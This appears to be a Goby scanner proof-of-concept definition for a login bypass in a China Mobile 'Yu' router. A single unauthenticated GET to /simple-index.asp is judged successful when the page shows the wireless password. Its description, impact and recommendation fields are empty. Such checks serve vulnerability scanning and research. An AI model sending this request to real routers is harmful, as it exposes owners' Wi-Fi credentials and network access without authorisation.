{
      "Name": "中国移动 禹路由 登录绕过",
      "Level": "3",
      "Tags": [],
      "GobyQuery": "body=\"中移\"",
      "Description": "",
      "Product": "",
      "Homepage": "https://gobies.org/",
      "Author": "luckying",
      "Impact": "",
      "Recommandation": "<p>undefined</p>",
      "References": [
            "https://gobies.org/"
      ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/simple-index.asp",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "无线密码",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-06-29 17:19:37",
      "GobyVersion": "1.8.268"
}